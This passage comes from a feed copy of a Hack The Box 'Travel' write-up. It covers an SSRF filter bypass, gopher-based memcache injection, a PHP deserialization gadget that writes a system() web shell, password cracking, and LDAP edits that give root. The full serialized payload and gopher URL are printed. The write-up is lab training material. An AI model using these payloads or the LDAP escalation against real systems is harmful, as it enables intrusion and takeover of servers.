	&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;		
		&lt;span class=&quot;k&quot;&gt;die&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;h2&amp;gt;Hacking attempt prevented (Internal SSRF). Event has been logged.&amp;lt;/h2&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;		
	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Next, there’s the actual function that is used by the custom RSS extension to retrieve the XML content of the feed. Note that it uses curl so there’s a big risk of command injection if  the parameters are not sufficiently sanitized.&lt;/p&gt;

&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;url_get_contents&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;safe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;nv&quot;&gt;$url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;escapeshellarg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;nv&quot;&gt;$pl&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;curl &quot;&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;nv&quot;&gt;$output&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;shell_exec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$pl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$output&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Finally, there’s the &lt;strong&gt;TemplateHelper&lt;/strong&gt; class that is used to log data into the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/logs&lt;/code&gt;  sub-directory. This TemplateHelper isn’t used by the code at the moment but we could still use the &lt;strong&gt;init&lt;/strong&gt; function called by the class constructor in a deserialization attack if we are able to pass a serialized object to the web application.&lt;/p&gt;

&lt;h2 id=&quot;using-the-ssrf-to-inject-into-memcache&quot;&gt;Using the SSRF to inject into memcache&lt;/h2&gt;

&lt;p&gt;When we click the Awesome RSS link at the top right we get the posts displayed from the &lt;strong&gt;customfeed.xml&lt;/strong&gt; file hardcoded in the application since we didn’t specify any custom URL.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-travel/image-20200519211242784.png&quot; alt=&quot;image-20200519211242784&quot; /&gt;&lt;/p&gt;

&lt;p&gt;When we specfiy the feed URL with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://blog.travel.htb/awesome-rss/?debug=1&amp;amp;custom_feed_url=http:/10.10.14.33/customfeed.xml&lt;/code&gt; the XML from our server is retrieved and displayed.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-travel/image-20200519211549984.png&quot; alt=&quot;image-20200519211549984&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-travel/image-20200519211920530.png&quot; alt=&quot;image-20200519211920530&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In the source code, we see that there are HTML comments that are added, presumably by the &lt;strong&gt;debug.php&lt;/strong&gt; file that we enabled by adding the &lt;strong&gt;debug&lt;/strong&gt; parameter in the query. The output shows a PHP serialized object along with the key name. The output is cropped so we don’t see the full content of the key/value pair.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-travel/image-20200519212210864.png&quot; alt=&quot;image-20200519212210864&quot; /&gt;&lt;/p&gt;

&lt;p&gt;It’s possible to smuggle requests to the memcache backend service through the custom_url_feed parameter that gets processed by the curl command. As we saw earlier, there’s some anti-SSRF filtering but it’s pretty weak and easily bypassed by using a 0 instead of localhost or 127.0.0.1. To send precise memcache commands to the server, we can use the Gopher protocol URI handler and the &lt;a href=&quot;https://github.com/tarunkant/Gopherus&quot;&gt;Gopherus&lt;/a&gt; utility that’ll encode our payload in the right format.&lt;/p&gt;

&lt;p&gt;First we’ll do a test and create a simple key/value pair in the memcache instance. Gopherus automatically uses &lt;strong&gt;SpyD3r&lt;/strong&gt; as the key name, something we’ll need to change later. Also, I’m not using a properly serialized payload for the first test, this is just to see if we’ll be able to write to memcache.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-travel/image-20200519212815234.png&quot; alt=&quot;image-20200519212815234&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We’ll test locally on a netcat listener to see if it sends the payload correctly. Here we see that it correctly sends the command to set the &lt;strong&gt;SpyD3r&lt;/strong&gt; key and passed the CR and LF.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-travel/image-20200519213114194.png&quot; alt=&quot;image-20200519213114194&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We’re ready to test on the actual server, we’ll use the same payload and send it with Burp. We do need to change the 127.0.0.1 to 0 to avoid getting caught by the filter.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-travel/image-20200519213441178.png&quot; alt=&quot;image-20200519213441178&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Then when we check the content of the memcache through the &lt;strong&gt;debug.php&lt;/strong&gt; script we can see that our content has successfully been been injected.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-travel/image-20200519213356601.png&quot; alt=&quot;image-20200519213356601&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;finding-the-correct-encoding-for-the-key-name&quot;&gt;Finding the correct encoding for the key name&lt;/h2&gt;

&lt;p&gt;Before we can move on to the PHP deserialization attack we have to find the correct key name that will be deserialized when we visit the RSS page with the &lt;strong&gt;custom_feed_url&lt;/strong&gt; parameter. As we find during experimentation with Burp, the key name depends on the URI passed to the &lt;strong&gt;custom_feed_url&lt;/strong&gt; parameter. The content of the XML file does not affect the key name which is generated.&lt;/p&gt;

&lt;p&gt;For this next part we have to look at Wordpress’s source code and Simplepie’s source code to figure out how the key is constructed.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;https://github.com/WordPress/WordPress/blob/master/wp-includes/class-simplepie.php&lt;/li&gt;
  &lt;li&gt;https://github.com/simplepie/simplepie/blob/ae49e2201b6da9c808e5dac437aca356a11831b4/library/SimplePie/Cache/Memcache.php&lt;/li&gt;
  &lt;li&gt;https://github.com/simplepie/simplepie/blob/ae49e2201b6da9c808e5dac437aca356a11831b4/library/SimplePie/Cache/Base.php&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;The key name is constructed like this: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;md5(md5($name)+&quot;:&quot;+&quot;spc&quot;)&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;We can test this theory by computing the name and checking to see if it matches the first part of the key which is visible from the memcache debug info.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-travel/image-20200519214505327.png&quot; alt=&quot;image-20200519214505327&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Good, so the key matches what we saw earlier. We’ll need to use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;xct_0375e1e45d8573844bcfb43ffe0ca90a&lt;/code&gt; instead of the default value provided by Gopherus after we do the next part: serializing a payload that’ll let us write a PHP command shell.&lt;/p&gt;

&lt;h2 id=&quot;php-deserialization-attack&quot;&gt;PHP deserialization attack&lt;/h2&gt;

&lt;p&gt;As we saw in the source code and from the memcache dump, the content of the XML file gets converted to a PHP object, serialized then stored into the memcache database if the cache entry doesn’t exist or has expired. When the next user visits the page to view the content, the values are pulled from the memcache and the object is deserialized. This is where we come in, we’ll use the &lt;strong&gt;TemplateHelper&lt;/strong&gt; class to write a PHP command shell into the &lt;strong&gt;logs&lt;/strong&gt; directory.&lt;/p&gt;

&lt;p&gt;We copy the class to another PHP file and add a line that creates the object, passing the filename and content as parameters then echo the output so we can use with Gopherus.&lt;/p&gt;

&lt;p&gt;Note: It is also important to change the $file and $data variables to private otherwise they won’t be included in the output.&lt;/p&gt;

&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;

&lt;span class=&quot;kd&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;TemplateHelper&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__construct&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;init&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__wakeup&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;init&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;init&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;        
        &lt;span class=&quot;nv&quot;&gt;$this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;file&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;nb&quot;&gt;file_put_contents&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;__DIR__&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;/logs/&apos;&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;###&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;### The part below has been added&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;###&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$user&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;TemplateHelper&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;snow.php&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;&amp;lt;?php system($_REQUEST[&quot;c&quot;]); ?&amp;gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;serialize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$user&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;When running the script, we get the serialized output:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;snowscan@kali:~/htb/travel$ php exploit.php
PHP Warning:  file_put_contents(/home/snowscan/htb/travel/logs/snow.php): failed to open stream: No such file or directory in /home/snowscan/htb/travel/exploit.php on line 23
O:14:&quot;TemplateHelper&quot;:2:{s:4:&quot;file&quot;;s:8:&quot;snow.php&quot;;s:4:&quot;data&quot;;s:32:&quot;&amp;lt;?php system($_REQUEST[&quot;c&quot;]); ?&amp;gt;&quot;;}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;reverse-shell&quot;&gt;Reverse shell&lt;/h2&gt;

&lt;p&gt;So we’ll go back to Gopherus with the PHP payload and get the payload for the memcache injection.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-travel/image-20200519215655193.png&quot; alt=&quot;image-20200519215655193&quot; /&gt;&lt;/p&gt;

&lt;p&gt;After changing the key for the correct value and replacing 127.0.0.1 by 0 we get the following payload:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gopher://0:11211/_%0d%0aset%20xct_0375e1e45d8573844bcfb43ffe0ca90a%204%200%20103%0d%0aO:14:%22TemplateHelper%22:2:%7Bs:4:%22file%22%3Bs:8:%22snow.php%22%3Bs:4:%22data%22%3Bs:32:%22%3C%3Fphp%20system%28%24_REQUEST%5B%22c%22%5D%29%3B%20%3F%3E%22%3B%7D%0d%0a
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We’re ready to rock &amp;amp; roll now, first we populate the memcache with the payload:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-travel/image-20200519220457976.png&quot; alt=&quot;image-20200519220457976&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Then we go to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://blog.travel.htb/awesome-rss/?debug=1&amp;amp;custom_feed_url=http://10.10.14.33/customfeed.xml&lt;/code&gt; to trigger the deserialization.&lt;/p&gt;

&lt;p&gt;And finally we test and see that our command shell has successfully been written. We have RCE.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-travel/image-20200519220622095.png&quot; alt=&quot;image-20200519220622095&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We’ll get a reverse shell with netcat.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-travel/image-20200519220905618.png&quot; alt=&quot;image-20200519220905618&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;enumeration&quot;&gt;Enumeration&lt;/h2&gt;

&lt;p&gt;We got a shell but we’re still running as www-data and haven’t found the user flag yet. After looking around the box we find a backup of the wordpress instance in the &lt;strong&gt;/opt&lt;/strong&gt; directory.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-travel/image-20200519221106322.png&quot; alt=&quot;image-20200519221106322&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The database backup contains the hashed values for the users.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-travel/image-20200519221232400.png&quot; alt=&quot;image-20200519221232400&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The password for the &lt;strong&gt;lynik-admin&lt;/strong&gt; user is cracked with john.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-travel/image-20200519221423280.png&quot; alt=&quot;image-20200519221423280&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-travel/image-20200519221457266.png&quot; alt=&quot;image-20200519221457266&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We can now log in with SSH to the box and get the user flag.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-travel/image-20200519221545913.png&quot; alt=&quot;image-20200519221545913&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;ldap-recon&quot;&gt;LDAP recon&lt;/h2&gt;

&lt;p&gt;The machine is running a container for the wordpress instance we saw earlier but there’s also another container running an LDAP server as indicated in the host file.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-travel/image-20200519221749649.png&quot; alt=&quot;image-20200519221749649&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We can query the server with ldapsearch but we don’t have credentials so it returns no objects.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-travel/image-20200519222048687.png&quot; alt=&quot;image-20200519222048687&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In the home directory, the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.viminfo&lt;/code&gt; file contains a password.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-travel/image-20200519222239619.png&quot; alt=&quot;image-20200519222239619&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We’re now able to pull a list of users from the LDAP server:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-travel/image-20200519222401264.png&quot; alt=&quot;image-20200519222401264&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This machine has a special NSS configuration that uses the LDAP server to fetch additional user information.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-travel/image-20200519222448512.png&quot; alt=&quot;image-20200519222448512&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We can see the effective user list with the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;getent&lt;/code&gt; command:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-travel/image-20200519222604273.png&quot; alt=&quot;image-20200519222604273&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;ldap-users-attribute-modification&quot;&gt;LDAP users attribute modification&lt;/h2&gt;

&lt;p&gt;We can probably modify the users attributes in the LDAP since our user is an LDAP administrator. The user records look like this:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;dn: uid=gloria,ou=users,ou=linux,ou=servers,dc=travel,dc=htb
uid: gloria
uidNumber: 5010
homeDirectory: /home/gloria
givenName: Gloria
gidNumber: 5000
sn: Wood
cn: Gloria Wood
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: inetOrgPerson
objectClass: posixAccount
objectClass: shadowAccount
loginShell: /bin/bash
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;I tried changing the uid by renaming the user but we don’t have access to do that. To make changes we can use LDIF files or use a tool like Apache Directory Studio.&lt;/p&gt;

&lt;p&gt;I’ll reconnect my SSH and enable port-forward so I can reach the LDAP server directory from my machine: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo ssh -L 389:172.20.0.10:389 lynik-admin@10.10.10.189&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;First, we’ll set the user’s password to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;welcome123&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-travel/image-20200519223414929.png&quot; alt=&quot;image-20200519223414929&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Then we’ll change the Group ID to 27 (sudo) so our user will be able to become root once we have a shell.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-travel/image-20200519223450128.png&quot; alt=&quot;image-20200519223450128&quot; /&gt;&lt;/p&gt;

&lt;p&gt;To add an SSH public key, we need to add the &lt;strong&gt;ldapPublicKey&lt;/strong&gt; object class first.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-travel/image-20200519223537871.png&quot; alt=&quot;image-20200519223537871&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Then we can add the &lt;strong&gt;sshPublic&lt;/strong&gt; attribute and put our SSH key there.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-travel/image-20200519223658288.png&quot; alt=&quot;image-20200519223658288&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;last-step-to-root&quot;&gt;Last step to root&lt;/h2&gt;

&lt;p&gt;Now we can SSH to the server using RSA authentication then use the sudo command with the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;welcome123&lt;/code&gt; password we set earlier in the LDAP server.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-travel/image-20200519223748937.png&quot; alt=&quot;image-20200519223748937&quot; /&gt;&lt;/p&gt;</content><author><name>thi0x</name><email>amir.mehrez.garcia@gmail.com</email></author><category term="hackthebox" /><category term="infosec" /><category term="vhosts" /><category term="php" /><category term="git" /><category term="memcache" /><category term="ssrf" /><category term="gopher" /><category term="deserialization" /><category term="ldap" /><category term="viminfo" /><category term="nss" /><summary type="html">Travel is an awesome box from my ATeam teammates [xct](https://twitter.com/xct_de) and [jkr](https://twitter.com/ATeamJKR). The box has a code review part where we analyze the source code of a PHP web app to find a command injection vulnerability in a curl command. We then use the Gopher protocol to perform SSRF and write a serialized PHP payload into the memcache database. For the priv esc part, we manipulate attributes of a user in an LDAP database which is used by the NSS facility to extend the Linux authentication database.</summary></entry></feed>